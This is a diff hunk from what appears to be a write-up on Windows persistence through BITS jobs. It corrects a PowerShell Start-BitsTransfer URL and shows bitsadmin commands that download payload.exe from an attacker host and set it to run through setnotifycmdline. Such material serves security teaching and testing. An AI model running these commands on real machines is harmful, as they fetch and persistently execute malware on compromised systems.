@@ -57,7 +57,7 @@ python3 -m http.server 8080
 
 On the compromised Windows machine, the attacker executes PowerShell commands to create a persistent BITS job:
 ```powershell
-$job = Start-BitsTransfer -Source "http://192.168.1.131/payload.exe:8080" -Destination "C:\Users\Public\payload.exe"
+$job = Start-BitsTransfer -Source "http://192.168.1.131:8080/payload.exe" -Destination "C:\Users\Public\payload.exe"
 bitsadmin /create /download MaliciousJob
 bitsadmin /addfile MaliciousJob "http://attacker-server/payload.exe" "C:\Users\Public\payload.exe"
 bitsadmin /setnotifycmdline MaliciousJob "C:\Users\Public\payload.exe" ""
